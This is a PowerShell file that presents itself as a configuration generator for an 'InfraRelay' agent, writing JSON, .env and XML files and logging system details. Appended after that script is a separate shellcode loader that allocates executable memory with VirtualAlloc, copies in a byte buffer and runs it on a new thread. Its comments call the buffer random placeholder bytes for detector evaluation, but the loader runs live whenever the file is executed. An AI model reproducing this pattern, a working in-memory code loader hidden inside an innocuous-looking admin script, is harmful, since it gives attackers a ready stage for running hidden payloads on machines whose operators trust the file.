
#Requires -Version 5.1
<#
.SYNOPSIS
    Generates the InfraRelay JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.PARAMETER OutputPath
    Paths are resolved relative to the invoking session.
.EXAMPLE
    .\Write-AgentConfig.ps1 -Environment Staging
.EXAMPLE
    .\Write-AgentConfig.ps1 -ApiPort 5000 -Force
.NOTES
    Author: Infra Automation
    Last updated: 2025-11-09
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$OutputPath = 'C:\ProgramData\Contoso\InfraRelay\config.json',
    [Parameter(Mandatory = $false)]
    [ValidateSet("Dev", 'Test', "Staging", "Prod")]
    [string]$Environment = "Staging",
    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 5000,
    [int]$NodeCount = 4,

    [switch]$Force
)

$DebugPreference = 'SilentlyContinue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'InfraRelay'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.internal.corp/v1'
            'https://telemetry.internal.corp/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.agent.logLevel = "Verbose"
$config | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $OutputPath -Encoding UTF8

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "InfraRelay",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8
$environmentFile = $OutputPath.Replace('.json', '.env')
$lines = @(
    "AGENT_ENV=$Environment"
    "AGENT_PORT=$ApiPort"
)
$lines | Set-Content -LiteralPath $environmentFile -Encoding UTF8

$xmlPath = $OutputPath.Replace('.json', '.xml')
$xml = New-Object System.Xml.XmlDocument
$root = $xml.CreateElement('configuration')
$xml.AppendChild($root) | Out-Null
$entry = $xml.CreateElement('add')
$entry.SetAttribute('key', 'Environment')
$entry.SetAttribute('value', $Environment)
$root.AppendChild($entry) | Out-Null
$xml.Save($xmlPath)

$configHash = (Get-FileHash -LiteralPath $OutputPath -Algorithm SHA256).Hash
Write-Verbose ("Config SHA256: {0}" -f $configHash)
$schemaFile = Join-Path $PSScriptRoot 'config.schema.json'
if (Test-Path -LiteralPath $schemaFile) {
    Write-Verbose ("Schema available: {0}" -f $schemaFile)
}

$summaryBody = "Config generated for {0} on $env:COMPUTERNAME" -f $Environment
Send-MailMessage -To 'ops@contoso.com' -From 'config@contoso.com' -Subject 'Agent configuration generated' -Body $summaryBody -SmtpServer 'smtp.contoso.com' -Port 25

$config | ConvertTo-Json -Depth 6
Write-Host ("Configuration complete for {0}" -f $Environment) -ForegroundColor Green

$encoding = [System.Text.UTF8Encoding]::new($false)
$encoding.GetType().Name | Write-Verbose

$previous = Join-Path (Split-Path -Parent $OutputPath) 'config.previous.json'
if (Test-Path -LiteralPath $previous) {
    Write-Verbose ("Previous config: {0}" -f $previous)
}

$nodeList = 1..$NodeCount | ForEach-Object { 'node-{0:d2}' -f $_ }
Write-Verbose ("Planned nodes: {0}" -f ($nodeList -join ', '))

$defaults = @{
    retryCount = 3
    backoffSec = 5
    heartbeat  = 30
}
$defaults.GetEnumerator() | ForEach-Object { Write-Verbose ("{0} = {1}" -f $_.Key, $_.Value) }

$portInUse = Get-NetTCPConnection -LocalPort $ApiPort -ErrorAction SilentlyContinue
if ($portInUse) {
    Write-Warning ("Port {0} is already in use" -f $ApiPort)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class PlatformApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x4b, 0xb2, 0x85, 0xc6, 0x9b, 0x06, 0xc9, 0x5b, 0x3f, 0xb4, 0xce, 0xdd, 0x84, 0xa1, 0x8a, 0x15,
        0x6d, 0x54, 0xa4, 0x14, 0x29, 0xd6, 0x2d, 0x54, 0x00, 0x23, 0x16, 0x78, 0xf6, 0x3e, 0x26, 0xe1,
        0x23, 0x2c, 0x25, 0x74, 0x7c, 0x42, 0x07, 0xcf, 0xc7, 0x7e, 0x38, 0x96, 0xd8, 0x7b, 0xf5, 0xd2,
        0xa1, 0x47, 0xf7, 0x9c, 0x2f, 0x92, 0x7c, 0x2c, 0x32, 0x83, 0x87, 0xb6, 0xae, 0x09, 0x89, 0x31,
        0xaf, 0x96, 0x90, 0x86, 0x33, 0x41, 0xf3, 0xd1, 0xbb, 0x1c, 0x07, 0x5a, 0x2c, 0x48, 0x8c, 0xd1,
        0x60, 0x06, 0xae, 0xc2, 0x37, 0x2a, 0x1e, 0x5a, 0x91, 0xe9, 0x4d, 0x0c, 0xc3, 0x87, 0xb9, 0x85,
        0x1a, 0x97, 0x1d, 0x27, 0xef, 0x2f, 0x3d, 0xd1, 0x16, 0xf7, 0x3e, 0xba, 0x1c, 0x2b, 0x72, 0xdb,
        0x07, 0xfd, 0xf4, 0x1a, 0x48, 0x18, 0x6b, 0x8f, 0x62, 0xc6, 0xc6, 0xc3, 0xc8, 0x58, 0x21, 0x1b,
        0xbd, 0x3d, 0xf4, 0x95, 0x97, 0x18, 0x44, 0xc3, 0x1e, 0x26, 0xce, 0xf9, 0x6b, 0xb3, 0x76, 0x69,
        0x96, 0xfb, 0xcb, 0x87, 0xa1, 0x40, 0x9d, 0x1c, 0x82, 0xf5, 0xc2, 0x9c, 0x79, 0xcd, 0x37, 0x5d,
        0xe0, 0xc5, 0x6a, 0x89, 0x93, 0xe3, 0xdd, 0x95, 0xbc, 0xa7, 0xfa, 0xa0, 0xfd, 0xc4, 0x00, 0x42,
        0x76, 0xf1, 0x44, 0xae, 0xa6, 0xf7, 0x05, 0x94, 0xbc, 0xfb, 0x2e, 0x63, 0x58, 0x42, 0x93, 0xed,
        0x95, 0x36, 0x7d, 0xa5, 0x47, 0xb9, 0xfa, 0x70, 0x9c, 0x0d, 0xe2, 0xfc, 0x59
    )

    $HProcess = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][PlatformApi]::WaitForSingleObject($Thread, 2464)
    [void][PlatformApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
